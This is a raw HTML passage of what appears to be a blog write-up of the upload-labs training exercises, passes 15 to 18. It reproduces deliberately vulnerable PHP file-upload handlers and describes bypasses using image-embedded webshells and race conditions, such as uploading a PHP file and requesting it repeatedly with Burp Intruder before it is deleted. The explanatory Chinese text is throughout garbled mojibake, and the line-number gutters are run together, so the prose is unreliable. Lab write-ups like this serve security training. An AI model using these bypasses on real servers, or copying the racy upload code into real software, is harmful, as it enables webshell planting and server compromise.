class="number">123456789101112131415161718192021222324252627282930313233343536</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-13<br><img src="https://img-blog.csdnimg.cn/20190619095026297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485</span></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/2657#toc-13">è¿™ç¯‡æ–‡ç« </a>ï¼Œå¯æ˜¯åœ¨å¤ç°çš„æ—¶å€™è¿˜æ˜¯å› ä¸ºäºŒæ¬¡æ¸²æŸ“ä»¥åphpä»£ç è¿˜æ˜¯å‡ºè¢«ä¿®æ”¹ã€‚</p><h2 id="Pass-17-æ¡ä»¶ç«äº‰"><a href="#Pass-17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17-æ¡ä»¶ç«äº‰"></a>Pass-17-æ¡ä»¶ç«äº‰</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯æ¡ä»¶ç«äº‰ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œå¦‚æœåœ¨åˆ™é‡å‘½åï¼Œå¦åˆ™åˆ é™¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ 1.phpåªéœ€è¦åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®å³å¯ï¼Œå¯ä»¥åˆ©ç”¨burpçš„intruderæ¨¡å—ä¸æ–­ä¸Šä¼ ï¼Œç„¶åæˆ‘ä»¬ä¸æ–­çš„è®¿é—®åˆ·æ–°è¯¥åœ°å€å³å¯<br><img src="https://img-blog.csdnimg.cn/20190619101858627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619101917177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-18-æ¡ä»¶ç«äº‰"><a href="#Pass-18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-18-æ¡ä»¶ç«äº‰"></a>Pass-18-æ¡ä»¶ç«äº‰</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190619104159629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› æ­¤ä¹Ÿå­˜åœ¨æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œä¸è¿‡è¿™é¢˜å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸æ–­ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç”±äºæ¡ä»¶ç«äº‰å¯èƒ½æ¥ä¸åŠé‡å‘½åï¼Œä»è€Œä¸Šä¼ æˆåŠŸã€‚</p><p><img src="https://img-blog.csdnimg.cn/20190619120245814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619120306313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" 